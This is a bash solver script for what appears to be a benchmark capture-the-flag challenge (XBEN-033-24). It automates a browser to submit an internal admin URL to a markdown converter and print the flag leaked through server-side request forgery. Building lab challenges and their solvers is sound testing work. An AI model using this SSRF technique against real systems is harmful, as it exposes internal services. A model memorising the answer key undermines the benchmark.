#!/usr/bin/env bash
# XBEN-033-24 — SSRF in a markdown URL converter. Proxy-mode twin. The converter
# fetches any URL it is given, server-side, so pointing it at the internal
# admin/flag endpoint returns the flag. Driven through the browser form.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
TARGET="${2:-http://127.0.0.1/admin/flag}"
SESSION="xben033p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
ab wait 'input[name=url]' >/dev/null 2>&1 || true
ab fill 'input[name=url]' "$TARGET" >/dev/null
ab click 'button[type=submit], input[type=submit], button' >/dev/null 2>&1 || true
ab wait --load networkidle >/dev/null 2>&1 || true
print_flag
